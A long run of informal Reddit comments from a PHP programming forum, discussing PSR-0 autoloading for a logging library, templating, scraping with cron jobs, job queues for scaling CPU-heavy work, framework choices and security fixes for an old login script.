You're letting the customer do the designing. My guess is that this will end in tears. What is the use case for this? Is it really really really what they need?
There are plenty of wrappers and tutorials how to do this in php: * [What to say to ffmpeg](http://electron.mit.edu/~gsteele/ffmpeg/) * [How to call it from php](http://www.phpsnaps.com/snaps/view/grab-image-convert-video-to-h264-single-php/) * [phpvideotoolkit - object oriented wrapper for FFmpeg, FLVTools2 and Mencoder](http://code.google.com/p/phpvideotoolkit/)
I think about what it is I am wrapping, and try to generalize it to the abstract. For example, if I'm trying to wrap some grungy payment processing client library, chances are there are just a handful of operations I'm really going to need e.g. authorize, capture, credit, void, etc. I then create an interface which prescribes what a payment provider fundamentally needs to be able to "do". This interface uses payment processing domain method names (authorize(), capture(), etc.) but the parameters are from my company's domain (for example, the interfaces which describe accounts, transaction identifiers, money, etc.). Then I create the concrete class which basically maps from my company's domain to the payment processor's domain. In doing this there is usually occasion to create data transfer objects for encapsulating messages to and from the payment provider. Out of these DTOs I try to abstract yet more interfaces or abstract classes, although it's often hard to tell what these should look like until you've dealt with a few different service providers. I'm not familiar with CodeIgniter libraries but to the extent it isolates third-party code and makes it look like "regular" code in your system, it sounds like a reasonable approach. 
My personal favourite change is the new enhanced status page for FPM.
Aww, poor baby. When that happens, I do two things: 1. Recommend the client reconsider, for user experience reasons X, Y, and Z. 2. Accept that if they want it, I'm going to have to do it, because I like having food on my plate and a roof overhead.
Try PHPMailer or SwiftMailer, swiftmailer being my preference. Consistent and reliable email isn't an easy problem. Even getting the line endings in the email wrong could cause some email servers to reject the mail. Then there's the DNS issues to contend with. Save yourself a headache and use an email lib of some type.
(Sorry for doing this in multiple comments, I'm a karma whore.) I avoid using `define` to create constants outside of classes unless the constants will be used in multiple classes/files and in contexts distinct from the class/constant where the constant will be defined. In a "static class" (a class with just static methods, like this `letter_rearranger`), I would declare the constants as [class constants](http://php.net/manual/en/language.oop5.constants.php), e.g. class letter_rearranger { const WORD_LIST_NAME = 'words.txt'; const USABLE_LETTERS = 'abc...'; const MAX_INPUT_LENGTH = 18; } and called as if (!file_exists(letter_rearranger::WORD_LIST_NAME)) letter_rearranger::call_exception('Invalid wordlist path.', __LINE__); This is another "play-well-with-others" choice: * It prevents possible clashes with other possible `MAX_INPUT_LENGTH` constants that might be declared. Classes are not [namespaces](http://php.net/manual/en/language.namespaces.php), but it doesn't hurt that they do namespace-y things. * More importantly, it makes the constant's purpose apparent. Another programmer trying to integrate your class into her code wouldn't might not know what `MAX_INPUT_LENGTH` refers to. Does that mean the login function she's writing can only ~~except~~ accept 18-character long passwords? `letter_rearranger::MAX_INPUT_LENGTH`, on the other hand, tells her that the constant is only relevant to input to the letter rearranger. If I were using instantiated objects instead of a static class and the values weren't going to be accessed outside of the `letter_rearranger` class, I'd use [private properties](http://php.net/manual/en/language.oop5.visibility.php) instead: class letter_rearragner { private $word_list_name = 'words.txt'; private $usable_letters = 'abc...'; private $max_input_length = 18; } PHP doesn't have a `private const` (an immutable private property) so you have to decide between private and immutable. I usually go with private, since a) interface pollution bothers me and b) people are usually smart enough not to try to mess with these kinds of properties within the class. edit: except != accept
Exactly. Next can we get transitions? Oh, and can and we need this particular image to last longer... oh and in the end we kind of want a montage of all the images... oh can we also allow videos and Mark wants to attach a powerpoint as slide 3 for our charts...
I should add that I understand that since namespaces don't conflict with classes, I can say `class Foo` then `namespace Foo; class Foo` and then `use \Foo\Foo as Foo2`, avoiding a conflict that you can't do with just a class. Still, we need something shorter than including `use \Foo\Foo` at the top of every file (which could be dozens or even hundreds in a large project).
I think as a professional you have to have some standard as to what you produce, otherwise you're just a commodity.
Depends what your settings are, it doesn't necessarily output to where the error_log does. Usually if the exception goes uncaught it'll output to the page, however you can control that.
PHP, Y U NO DO IT LIKE ALL THE OTHER LANGUAGES THAT ARE LESS POPULAR THAN YOU!?!
Then don't be PSR-0 compliant. Their goal is interoperability, not super easy and readable. If that conflicts with your goals, don't worry about it. Do you really need to be interoperable with the big frameworks?
He who resorts to ad hominem loses. Good day.
He who thought we were actually competing in something finds himself fooled - confucious, who once said a lot of things.
Ah, sorry about the confusion. I meant adding the linenumber and function/classname of the _caller_. Especially when you add the option to sort the results, it might be useful to see where the call came from. I'm guessing you're using [debug_backtrace](http://php.net/manual/en/function.debug-backtrace.php) already, so you can get that info from there. 
Using static methods probably worsens the feeling that namespaces goes against the micro goal. If you were instantiating your logging class then you'd only have to define the namespace path once.
True, i don't need the extra 'as Analog'. The trouble is in multiple files, you have to add this to the top of each one. If you have lots of files you end up with a lot of extra namespace code that I'd like to reduce.
But then you're just doing a 'global $log' or some equivalent thereof in place of the 'use' line (using a registry that acts as your app's global namespace).
instead of using 'letter_rearranger::' you can use 'self::'
The use would only need to look like this: use Analog\Analog; When accessing a namespace your file looks at the furthest right (or "as") for its reference. 
I'm "one of those people" who looks at PSR-0 as a check - for anything larger than one file. Edit: (forgot to make my point about that statement) - PSR-0 ensures any library I add to mine will work as intended as well as not clobber my code or any other third party code I add. People who use PSR-0 accept the minor inconvenience of "use Analog\Analog" for all the things PSR-0 brings to the table. Alternatively, I would suggest one of the following: * Changing the class name to something like "Log" or "Logger" (use Analog\Log;) * Changing the namespace to something like JBroadway (use JBroadway\Analog;)
A compromise perhaps - as I said in another comment, people including this in their code will accept the inconveniences you mentioned because it's PSR-0 (nothing wrong w/ that). However, making your library PSR-0 _compatible_ is merely giving the option of using it as a PSR-0 lib. You could make your lib PSR-0 compatible, but also create an include file for those that do not want to use PSR-0. This include file (in your repo) would create a class in the global namespace called Analog that would just extend Analog\Analog.
Was thinking of something like this, even just 'class Analog extends \Analog\Analog' ought to do, and that class could also have a tiny autoloader in it for the built-in handlers, so a single require would cover it. Thanks, will try this shortly!
Yep. Automotive dealership websites do this all the time.
No way to escape from that, unfortunately. If you look at code from "new" (5.3&lt;) frameworks, you'll see it everywhere, it's just something we have to live with.
And a watermark. But not on the slideshows with those images Judy took last year. And can you rotate cell phone images taken sideways?
Just pushed PSR-0 support to the github repo. It now works both ways, either via `use \Analog\Analog; Analog::log ('log me');` or `require 'Analog.php'; Analog::log ('log me');` which loads its own mini autoloader for its bundled handlers.
Didn't ASP.NET implement the same kind of "fix" as PHP? Seen the talk last week so my memory may be fuzzy.
Looks good. May I suggest moving /lib/Analog.php out of /lib though. At first it confused me, I thought it was tied to the PSR code then realized it was for the non-version. Let the /lib directory be dedicated to PSR. I would also suggest adding a phpunit config file. This will allow anyone who checks out the library to run `phpunit` (with no additional arguments) from the command in the root folder. If you need help with this I can do a PR for you on my lunch break.
&gt; Edit: (forgot to make my point about that statement) - PSR-0 ensures any library I add to mine will work as intended as well as not clobber my code or any other third party code I add. Actually, the [PSR-0 Reference Implementation](https://gist.github.com/221634) itself won't play nice and will clobber your code. It doesn't support running multiple multiple autoloaders for the same namespace (since it will fatal error on the `require` call if the file doesn't exist). This also means that you can't call `class_exists($class)` on a non-existent class (that the autoloader will load), since that will cause a fatal error on the require. I don't disagree with the concept, and I use something [very similar](https://github.com/ircmaxell/PHP-CryptLib/blob/master/lib/CryptLib/Core/AutoLoader.php#L58) (it's technically PSR-0 compliant, but the only line that does that is #65). One thing I'd note is that I don't want to care about how a 3pd library that I use loads its classes. I don't want to have to worry about setting up an autoloader. I don't want to have to worry about "setting anything up". It's that reason that I use and recommend using a [bootstrap file](https://github.com/ircmaxell/PHP-CryptLib/blob/master/lib/CryptLib/bootstrap.php). So to use the 3pd library, all you need to do is `require_once '/path/to/bootstrap.php';`. It can do whatever it needs to (including loading compatibility libraries, checking for config files, whatever) without me needing to worry about it at all. If all of the significant libraries utilized this concept of bootstrapping, then there'd be no need to worry about checking if the library is PSR-0 compliant, or setting up an autoloader for it. Just include the file and you're done. Just my $0.02...
The reference file you linked to is more of a proof of concept that "works". I would never use that class in an implementation. PSR libraries shouldn't have their own autoloader. PSR libraries conform to a standard so when they're imported into a project any PSR loader can handle The [Symfony2 ClassLoader](https://github.com/symfony/ClassLoader) is a great implementation of a PSR loader. Your bootstrap example is what happens with PSR-0. I start a new project, create a bootstrap.php file. Inside here I include a PSR loader and tell it "I'm using Analog located in _this_ directory and I'm using OAuth2 locating in _this_ directory". In your code you then just call classes without having to worry where files are. Now, the benefit here is you just know how it works as everyone follows the same standard. Each lib having their own bootstrap/loader creates confusion for a person trying to understand how a new 3rd party lib they're trying to use works.
I think the only difference to making PSR-0 work nicely with others is to include the file_exists() condition and return true/false. It not doing that is bad practice IMO. I can understand the other limitations it has, but that one seems like a mistake to me.
There's a lot of wasteful code going on in here - why not use regular expressions instead of all those for loops?
I think you're taking the micro concept too far. You sound like you're making it about lines of code and in the process you damage things like testability. I'm a guy who really prefers slim code, I'd honestly never use anything from pear or pecl as it's typically way over architectured, hell, I even think frameworks like codeigniter are too bloated. That said, I still believe that, despite wanting slim code, testability and extendibility are things which should not be sacrificed for lines of code.
Oh man. I live in River North. What's the salary range?
I guess there isn't a request object when using PHPUnit. Perhaps one of the zend-sepcific assertions within Zend_Test_PHPUnit_ControllerTestCase would help? I'm not sure if there's one that can test the secure-ness of an addres being that you're not actually accessing it using an address.
&gt; $asshole_coding_practices How so? I'd be doing this with LGPL only, including references to them in any documentation, and reference them whenever else I can.
Indeed, that would result in very confusing behaviour. You could definitely argue that makes static classes better than a global variable but that be kinda missing the point as there are bigger issues with both.
Take this example, a simple logging class. I also have a static class for assertions. With DI, that means passing those two classes to every class that might need to log or do an assert. In addition, these now have to instances to be declared in every class. That's a lot of work for almost zero gain. I'm a big fan of DI but it's not the solution to every problem.
Practically any dynamic web-based language can do this (among many others, too). PHP included. Regarding your example, I *think* that Amazon has an API that you can use to just request this data, rather than lifting it from a page. However, if you know nothing about PHP and are trying to do this, you're not going to learn how in just an afternoon unless you're familiar with other similar languages.
Just how big is *X*? He wants a video more then half a second long, I assume.
Loving that others here on [/r/php](/r/php) are using/referencing the internals list for the source discussion behind these issues!
http://simplehtmldom.sourceforge.net/
amazing, I'm going to get on this tomorrow! Thank you
phpDoc hasn't been updated since early 2008. I'm pretty sure it craps out if it comes across a namespace. For being a paid author on a site called "PHP *Master*"; very little research seems to have been done. [ApiGen](http://apigen.org) is an actively maintained API documenter that has various installation methods, generates very good looking docs, supports namespaces, and even supports PHP 5.4 traits. 
ditto... until I matured as a mature developer
Ooh, didn't know about that one! Thanks, that could be just the thing to shave a few extra \Analog's off the top! Will try it out tomorrow.
I'll be interested because I'm learning this right now and I've chopped out info from simple sites perfectly, but I can't figure out more complicated stuff. I know some people are bored by this being a regular questions, but I like when there is fresh discussion about it, however simple it may be to experienced php programmers.
PHPs release cycle allows for security releases done quickly, they've done so in the past for critical releases.
As a 16 year webmaster... I personally would never use autoload like this... every time I see these types of implementations my body screams NOOOOOOOO!
imho, if you're using PHP in your templates then you're doing it wrong 
Did you forget that PHP is a templating language? Why would you start all your file with a `&lt;?php` otherwise?
I have had run this yet (having only edited your original in wordpad) but [http://codepad.org/p1BI4D29](http://codepad.org/p1BI4D29) is how I would have written your code, given the way you thought about it. 
This kill the server. First of all, your cache is useless, it will be empty at every run as PHP will not hold the value of the array across requests (or run if it's a script of some sort). If you want to have a cache, generate a map file that holds the array, and then just include that file, in that case it will actually be ran one time only. (Long time ago i was using that system, with a parameter ?clear_class_cache=1 to regenerate the file, as i just don't want users to do it). In and out, it is pretty bad anyway, i will only make use of a map file when i have classes that have pretty bad naming convention that renders them hard to autoload easily. Otherwise my standard autoload looks like this : public function autoload($className) { $pathToClass = str_replace("\\", "/", $className); require($pathToClass . ".php"); } If you have pre 5.3 style naming convention (underscore like Zend), you can just have an if/else and it remains simple and fast. 
I'll raise you with an even more simple way of doing templates: &lt;strong&gt;&lt;?php echo $var ?&gt;&lt;/strong&gt;
I'd suggest to wrap the require in a `file_exists()` call, otherwise a call to `class_exists($className)` can cause your application to fatal error. Otherwise, I agree 100% with your points.
&gt;eval("?&gt;" . $this-&gt;template . "&lt;?"); I would never do it in this fashion. Instead, I suggest that you save the filename and then simply include the file when you wish to publish it, like so: public function setFilename($file) { if (!is_file($file)) { throw new FileNotFoundException("File not found: $file"); } elseif (!is_readable($file)) { throw new IOException("Could not access file: $file"); } else { $this-&gt;file = $file; } } public function publish() { include $this-&gt;file; } If you wish to strip out the spaces, simply register an output buffer or something.
An unfortunate name. [ConsoleKit](http://www.freedesktop.org/wiki/Software/ConsoleKit) is/was already a thing.
Yup. We just use Beanstalkd with the php lib pheanstalkd, on top of that a few small framework specific job creation and worker classes and we are good to go. And we don't need to use PHP for everything ;)
So essentially, the author hasn't progressed at all since 2004. That's just plain shameful.
Actually the author had created it as a simple tutorial. He did an excellent job of telling what each part did, and then went back and re-wrote it in 2004 but hasn't visited the site since (I believe) 2008 or so. So it is an orphaned work, but AngryFrog has taken the task of trying to revamp it and bring it up to par with today's security concerns.
The "slightly more constructive criticism" would be extremely useful. Thanks for taking the time to expand on why you felt the way you did rather than a 'this sucks' comment. I would like to see it as secure as possible going forward. Other than the things you've already brought up were there any other gaping security holes? Not that it matters really, but do you have experience with securely coding in php? Obviously, more than I do. I would really appreciate the help and direction.
Note that Job Queue itself is a part of Zend Server which I suppose isn't written in PHP. So bringing up PHP memory issues or semaphore functions does not seem exactly relevant. PHP here is just a nice way to talk to Job Queue module.
I take your point about the SQL injection attack on register.php page, I guess you was referring to the activation element? That will be sorted asap. I'll take on board your comments about the select statements and get those prepared. Regarding process.php, obviously in 2004 OO code was not in the forefront of everyone's mind so that would explain it's make up. How would you go about it without having to rewrite the script, I'm guessing a class for each and every job that is carried out? Same for database access right?
Not your style?
Twig does this too: http://twig.sensiolabs.org/doc/tags/extends.html Of course "There is no need to learn another template language."
Build a blog with a basic content management system. Sure, it won't win any awards or anything, but it will teach you some core concepts in HTML, CSS, and PHP. You'll learn how to use loops to print to the browser, handle administrative logins, and of course how to display that in a somewhat pleasing manner
on contemplating that, it seems the first step would be to become more familiar with what a blog page might look in html, and then to go from there. Am I way off base there? I just googled CSS (seen it, never dealt with it) and it seems I am off base so I'll have to look into that first. Stuff to do!
Yes - I would recommend getting a basic understanding of HTML and CSS first. Its actually pretty straightforward. Build a basic layout for a blog or personal site in HTML and CSS. Since you're a programmer already, you know about keeping your code clean and commenting. After you have a basic layout in HTML/CSS, remove some of the static bits and replace them with PHP. 
Very interesting, I will definitely check this out as I tend to wind up writing a lot of deploy code in small util scripts and get annoyed at having to re-implement the same junk every time
Yeah, I know about Drupal's system - and I hate to sound like a total pessimist here - but it's very often a waste of everyone's time when noobs try and "help". Wait 'til you're well-versed and then contribute to your heart's content. 
You'd probably set up a cron job to either run the php file directly or use wget to "browse" to the php file. Most hosts will have help information available for this.
Thanks.. is "Cron job" what I should be looking for?
See also: Symfony 2 Console component.
What is with the defining your member vars above of the methods? That spreads them throughout the file making it difficult to read and find them, especially if they're used in multiple places, now or in the future.
Sorry to bother you again, but I asked my host and I can't have cron jobs because I have windows hosting. Also.. I am in a file manager and I can wget a website from there, but I can't figure out how to automate it. Any ideas? I'm not sure what's possible using wget.. if I have to run it manually, I could just make a page do it for me. Thanks in advance.
building a simple messageboard is also a good way to learn a lot of concepts. also, the php documentation at php.net is rather awesome.
I like this, although you could save some processing by only calculating the $anagramSeed information once. (length and letters it consists of)
If they don't have something like cron set up (there are options for windows, but they'd probably have to set them up) you can't really set a scheduled scrape. The only possible thing is if your website gets visitors regularly, you can set up your site to run a check every page load. Check to see when the last scrape was, and if it was &gt; 60 minutes ago, then run the scrape. OR of course you can set up another always-on computer that you control to wget the url to the scraper.
Yeah.. I'll probably just set up a check when loading the site. Thanks a lot for your time &lt;3
yes, after futzing around with google results, I've found that most of the useful stuff I've gotten is from php.net. for now, though, it seems that there will be no getting away from becoming very familiar with html and css at this point. It will be useful to know anyways.
Be careful doing this that you don't create a race condition. Namely: 60 minutes hits (3600 seconds). 80 people load your website 80 threads check "has scraper been run?" 80 threads see no 80 threads try to scrape Shit Hits The Fan and gets slow. At 3601 seconds, anther 80 requests come in. Scraper from the first 80 still hasn't finished, so another 80 scrapers kick off. Reapeat with enough traffic or a slow enough scraper, and suddenly your server is self-DDOS'ed Too avoid this, look into "locking" or "getting a lock" which will help to ensure that only one of the requests actually spawns the scraper. It's a pretty common issue.
Well, then he did a pretty crap job at it. If he's going to revamp it, it helps if he actually knows what he's doing.
You're better off simply scrapping the entire project. It is not fit for a modern project at all. Instead, rewrite it using modern best practices. Read up on the following things: http://php.net/manual/en/pdo.prepared-statements.php http://en.wikipedia.org/wiki/Cross-site_request_forgery http://shiflett.org/articles/session-fixation http://codahale.com/how-to-safely-store-a-password/ http://phpmaster.com/why-you-should-use-bcrypt-to-hash-stored-passwords/ https://www.owasp.org/index.php/Category:Attack https://www.owasp.org/index.php/Category:Vulnerability
Don't mistake my examples for blatant misunderstanding of the complexity involved, but would things like imgur 4chan and possibly even reddit have spawned from simple versions of what you list as basic first projects?
Yes.
I am not sure I understand, please explain.
**MOAR COMPUTARS** Edit: But seriously, I don't know what your app does, so this might be completely wrong. In fact: just adding more CPU-power, without working on the efficiency of your code will not fix the problem, but it will just force you to deal with it again in a few months time. Here are some things you could consider: - More caching. You say the results get stale each day. But, does _everything_ get stale? Perhaps you can store parts of the computation in the DB, reducing overall CPUtime. - Move parts of the computation to cronjobs. Perhaps it can be done during the night, or in the early morning, when your app gets less visitors. - Use a profiler to identify the bottlenecks. Sometimes it really isn't obvious what takes the longest time. If you profile your code, you'll know what parts you can rewrite/optimize for the highest performance gain. 
Yeah, I've been doing a lot of profiling lately to optimize the hot parts of my code as much as I can. But at the end of the day, there are just a lot of calculations that need to be done.
I don't know much more about this than you, but one thing that occurs to me is that the impact of the caching is likely to increase manyfold as the number of users gets higher, because there will be a much larger percentage of users accessing the same results. In fact if your results only go stale about once a day, I'd say you are in great shape to take better advantage of this, although the success will obviously depend on how many unique pages/queries are possible and how many are common. Sorry if I just stated the obvious.
Thanks for the input. Unfortunately, the caching is per user only... since each user has a different set of inputs per day. There is some data that all users access, which I already try to be aggressive about caching.
Rewrite the hard bits in C as a PHP extension.
Have you looked up whether you can set up a basic [grid engine](http://gridengine.org/blog/) solution to run your statistics jobs? Amazon EC2 seems like quite the overkill for jobs that take 10-20 seconds, unless you do a whole bunch of jobs one by one on it, which still seems like waste. Im saying this under the assumption that you book instances by the hour, not by the second or by the minute. [Seems like it from the FAQ](http://aws.amazon.com/ec2/faqs/#How_will_I_be_charged_and_billed_for_my_use_of_Amazon_EC2). With a Grid Engine implementation, It might slow down user response time, but by queuing your jobs and running them as and when CPU's are available, you get past the computer burning itself out. As your load increases you can add more servers and just chain them together under a specific queue, and GridEngine handles the submission and other dodgy parts, as long as you can ensure that all the nodes can access the data you are working on easily. A project i worked on used php to configure, write and submit jobs to a grid engine consisting of several servers, and then these files would be shown on the frontend to the user. Larger, more complex, jobs would tell the user their estimated run time, and then an email would be sent to the user upon job completion using the GridEngine.
If you just want to fetch Amazon data, the have an [affiliate program with API](https://affiliate-program.amazon.com/gp/associates/join/landing/tools.html) to get stuff in the *proper* way.
So all the servers are pointed at the job queue? Then when a server looks up the job queue it gets the first available job off the list and marks it as being worked on (so another server doesn't start work on the same job). Then when it's finished on the job it removes it from the queue? When you need more power, add more servers to keep pointing to the job queue. Would that work?
Use a service like http://www.webbasedcron.com/ Protect your scraper script with a password (maybe?) then just call it every hour
Why both with an expensive re-write in another language when buying more CPU power will be cheaper (and faster)....
buy your own server, max it out with RAM 16-32gig would be ideal. Add a ssd and I expect it'll fly. We do this with One and One, it works fine. Have you tried APC?
I'm actually thinking about just magnetically programming the bits one by one onto disk.
Imagine the cost of an internet connection able to support a 100k userbase
did you even read the post? &gt; does a lot of CPU-intensive simulations 
$reddits = json_decode(file_get_contents('http://www.reddit.com/reddits.json'));
how do you offload a job (have php call a python script and return the information) ? 
Yep, and have the python script call the php script at the end, would be the simplest implementation.
You should probably check with the worker queue periodically if the simulation is finished.
Plus, it's really easy. HTML is, at least, and compared to a programming language, CSS is as well :)
&gt; continually check with ajax... Probably more accurately, *regularly* check. The front end web page could check every 30 seconds or so. Of course, there are techniques (node.js, I think?) that will keep a connection open and just wait for the moment a message pops back to say the job is complete.
Will this not lock you into that particular cloud service? Are there any queues that are easy to install and will be portable across different cloud services? It depends on how you weigh up convenience *today* against portability *tommorrow* I guess.
Yes it does. But nowadays it's AWS or Rackspace, and it's unlikely you'll jump from one to the other. You could abtract the instance management to be able to handle multiple cloud API, but i think it would be a waste of time (a nice exercise though) as AWS or Rackspace are pretty much standard. The queue itself is not in the cloud (could be, but i prefer not), you keep your queue system (Gearman, RabbitMQ or custom) on your VPS or dedicated server, so that your queue itself does not rely on the cloud, just your workers. And that's where your flexibility is, if you realize 2 dedicated servers will do the same job as X EC2 instances for cheaper, you just have to setup your workers on those servers, which, if the workers are done properly, should be fairly easy to do. I had a case exactly like that, where we jumped from having workers on dedicated servers, to having them on EC2, we had install scripts for our workers, which made the process really easy : create an instance, setup X workers on this instance, take snapshot, and just start as many instances as needed for startup, and that's just what was needed, half a day of work. Adding the dynamic instance management was really easy and had no effect on the system, as the central queue is worker agnostic it just takes message in, sends them out, depending on a list of available worker. So having 1 or 1000 worker, on EC2, Rackspace or dedicated servers, is really not a problem for your queue system, as all matters is for it to know where they are (IP address).
Please have all my up votes.
TBH if you're on a dinky VPS your best bet is to move to a dedicated server.
well, considering that PHP's instance comes from C's libraries...
Ignore anything about HTML that references or recommends xhtml. You should be writing HTML5, so all your documents start with: `&lt;!DOCTYPE html&gt;`
imgur is exactly like a blog (with multiple submitters). It has an index view and a detail view for individual images with comments that you can vote on. The only difference is that it's for posting images instead of text. Reddit is similar, with threaded comments and a couple ranking algorithms. These sites have a lot of kinks built in to handle huge traffic, like lots of caching and infrastructure, (imgur probably hosts it's images with an edge caching company) or user interface changes like how reddit only shows 200 comments and makes you click to load more. In other words, to copy the features in PHP would only take a matter of days. But it wouldn't scale to the kind of traffic those sites have. But it would handle a few tens (hundreds?) of thousands of registered users at least.
That's not true. You can set the colour of text using the [SetConsoleTextAttribute()](http://msdn.microsoft.com/en-us/library/windows/desktop/ms686047%28v=VS.85%29.aspx) function of Kernel32's Console API.
It can be anything you want as long as you have a very clear image of what it needs to do. If you're already a capable java/c++ programmer then you should already have a decent idea of the technical limitations.
&gt; Do not wait on a page for the job to complete, the user will just think your'e sight is slow. More importantly he'll end up holding up an entire PHP process while the job is being crunched. A PHP process that is now unavailable to field other requests. So I agree with the use of an Ajax request, or a simple meta refresh on the page.
You may want to take a look at [Gearman](http://danga.com/gearman/), or [Beanstalkd](http://kr.github.com/beanstalkd/). I've had a lot of success with both of those technologies. Amazon also offers a messaging/job service called [Simple Queue Service](http://aws.amazon.com/sqs/). Beanstalkd is pretty straight forward and easy to use. You insert a job into it's queue from the front end using one of the many PHP beanstalkd clients available. A cron job on the back end performs an infinite loop that continuously checks for new jobs in the queue. When a job is found, it's processed, and then the loop waits for the next job to be available. It's really a stupidly simple system to setup, and you can have as many of those cron jobs running as you want. Gearman is a little more complicated, but well worth it for certain tasks. It's broken up into two components: The gearmand, and the workers. Gearmand acts as a job queue, and dispatcher. The front end sends jobs to gearmand, and it queues the jobs. The workers (Of which there can be one or hundreds) get notified by gearmand when there's a job to crunch. The benefit here is you can have dozens of workers "farmed out" across several servers. So you can start using Gearman with your VPS and a couple workers, and as your site grows add more workers on a EC2 instance. Gearman also lets your application wait until the job is finished being crunched by one of the workers.
Think of it like this: An exception is a situation that should not, if you can fix the situation then catch the exception and handle it properly so that you can continue the script execution. If you cannot handle the exception then don't catch it, let it bubble up to your exception handler *unless* you need some specialized form of logging. Usually you'd have an exception handler which does the error logging and such, logging in each try/catch block would get really tedious and repetitive. 
Another Technique is to use a Curl function for your URL and process the dumped variable. It'll grab the html; then build functions to grab tag contents from the variable. If done this way, it'll dump all contents of tags into an array. Then cycle through your array to get your content.
You'd be better off parsing http://www.reddit.com/reddits/.json.
Winner!!
I also didn't think it would have that much impact but the word list iterates 235,925 times per test (three tests on first run, four on second run) so I guess every little helps.
I think it is because you gave the solution that worked for you without really replying to what the OP said was his problem. You are 100% correct that profiling is the way to go to find out what a applications bottle necks are. However, based on what he said, more memory wouldn't likely solve the problem since he implies the CPU is the bottle neck during data processing, not memory or disk IO. I'd guess the biggest complaint about your solution is that it doesn't allow for horizontal scale which sounds like he'll definitely need if he's going to potentially have "several orders of magnitude" greater demand. Also, if you are doing massive web scrapping, you'd probably benefit more from having more parallelization than power if you're scraping many different websites and they can handle the heavy load. Of course many different machines probably makes managing the queues slightly more difficult.
Because it's more to do with calculation than reading and writing data (from what you seem to be saying), it might be worth having a play with HipHop PHP, converting the PHP to C++ and then into a native executable. This could cut CPU usage by up to to 40%. If you're having difficulties with caching, I highly recommend Memcached. Another thing you could do is have two servers where the web requests are distributed nicely through a load balancer. There's a simple application for this simply called "balance"
OK, so I wrote this as a quick php script for you to use if you would like: $base_url = 'http://www.reddit.com/reddits.json'; $after = null; while (true){ $reddits = array(); $url = ($after ? $base_url . "?after=$after" : $base_url); $data = json_decode(file_get_contents($url), true); $d = $data['data']['children']; for ($i = 0; $i &lt; count($d); $i++){ array_push($reddits, $d[$i]['data']['url']); } //do whatever you would like with current batch of reddits (like inserting into some sort of database or var_dump($reddits); $after = $data['data']['after']; if (!$after) break; sleep(2); } 
here in the bay area of California (San Fran) craigslist is a fantastic resource. Even if you don't live here, scour it for interesting jobs, I'm sure some will consider remotes.
I enjoyed coming back and reading the different threads that took all kinds of different directions since last week. That he turned my simple question around on me, after I expressed ignorance of the subject, is extremely telling. He must not know either :)
Here's a search for php jobs within 25 miles of Fairfax, VA at startups: http://www.startuphire.com/search/index.php?searchId=ff1cc6e110a863cad189a9f69e99f721
Sending you a message. I actually need to hire someone for some remote work. Will message details. Thanks!
Obviously; moment later I find it: http://www.adminer.org/en/
Let me know if you need some extra help, I usually have some time during the nights, and a few hours on the weekend to code!
Although not my favourite, the major players all use Zend and/or CodeIgniter. I'd suggest looking at these two purely because larger companies prefer them and it will open up more job options for you. (if this is something you are interested in)
I prefer Symfony (w/Doctrine), personally - it's robust and well-supported, lots of plugins and nice options for anything you'd want to do. Cake and Zend are also really popular, but I didn't really like how either of them flowed, they seemed counter-intuitive and clunky to me.
i'm also available for some side-work if the other people don't work out.
I personally discovered Yii this summer and loved it ever since. Great Framework with good documentation.
I have been using CodeIgniter and I love it. I have it connected with PHP ActiveRecord (http://www.phpactiverecord.org/) to handle all interactions with my database. I don't need to write any SQL code. Much like the way Ruby on Rails works, entries in the database are fetched and treated as objects. It's really convenient and the learning curve for me was about 1-2 months. I have never used any other frameworks before so I don't know what to compare this to, so take my information for what it is worth. The other Frameworks I considered were Kohana. Kohana is awesome but doesn't have a strong community or good documentation. I was finding myself confused a lot and not able to find a solution, so I left. The other framework I looked into is CakePHP. I didn't mess around with CakePHP at all though. It seems like a solid framework with a strong community, but a few people told me it is very inefficient and to stay away. I weighed the pros and cons of CakePHP vs CodeIgniter and eventually chose to work primarily with CodeIgniter. I'm really happy with CodeIgniter, but like I said already, it's the only framework I've really had the chance to explore. I'm sure it isn't the only good one to use, but it's the one I use and I can say that I'm very happy with it and I give it a positive review.
I do this for a living, feel free to contact me if these other people don't work out.
I run a similar environment with crawlers. I use an in-db queue list of jobs from which other servers (workers) get their tasks. Then you can append more workers to scale as your traffic requires. A simple script can get this approach going and it doesn't need to be feature-rich for it to function correctly. My 2 cents.
[/r/forhire](http://www.reddit.com/r/forhire)
phpmyadmin makes database work very easy. 
Yes, I'm interested in that. I was thinking about Yii, but I will consider Code Igniter Instead.
You're doing it wrong. **Assembly** shouldn't be used for such resource intensive tasks. Use the right tools for the right job. Consider writing your "task" **by directly manipulating the voltage and current in the proximity of your processor**. Once you have done that set up a job queue as someone else has suggested :) I hope that clears it up. But if not: http://www.8bitbrigade.com/images/smilies/954-not-sure-if-serious.jpg
I had the linux one years ago and had problems with it so switched to windows (can't remember exact details why though). The windows one was cheaper too. I'm asking really basic questions like this because I don't know about it, I have no idea what LAMP stack means. I am new to PHP and I have only learnt what little I do know from googling. I will research linux hosting to see if it'll help me more in future.. I don't want to ruin something else. Thanks for replying.
Before you architect your solution, figure out what the problem is by load testing what you have with simulated users. Way too often a great solution turns out to solve nothing because the real problem was a locked database table/column or just the opposite a small chunk of php code that worked fine for a small number of users. Please read up on Performance testing. Many engineers fail spectacularly because they just don't get performance testing. Look at something like jmeter to simulate the users. It will let you see very specific issues. (jmeter is better than selenium because it is not trying to render pages in the browser so it can simulate many more users per server) It is very important to have realistic usage patterns too. Try to find a way to log use on the current system so you can replicate that use in the load test. Don't solve problems you "think" you might have! You do not have time. Load Test, fix and repeat. Mytop is great for seeing slow running queries in mysql. All of the scalable solutions will seek to minimize the need for system resources, memory, disk, database locks and file locks... Queues work great as long as the workers are not all writing to the same table/column in the same database. It is almost impossible to predict the real issues ahead of time. Transactions, open connections, any query that takes more than 3 seconds can all cause scaling issues. Load Test, fix, repeat... If you end up with a farm of servers... Consider somthing lik http://code.google.com/p/scalr/ if you end up with a farm of servers. There are plenty of others too (puppet and CFEngine get mentioned alot)http://en.wikipedia.org/wiki/Comparison_of_open_source_configuration_management_software Everybody here (myself included) is telling you how they solved their problems, you need to be sure you have the same problem before you seek the same solution.. Success is a great problem to have :)
pssst... if($_SESSION["monster1"]["hp"] &lt;= 0) { // monster1 is dead } ;D
How is this going to run? How you approach the problem will make for a significantly different result. If it's going to be online and viewable as a web page you'll spend a lot more time than if you just made a command line program.
thanks, but I rather do it on my own. Only because I find it more fun, than for someone to give me the answer. Like I said before, I did this strictly for fun.
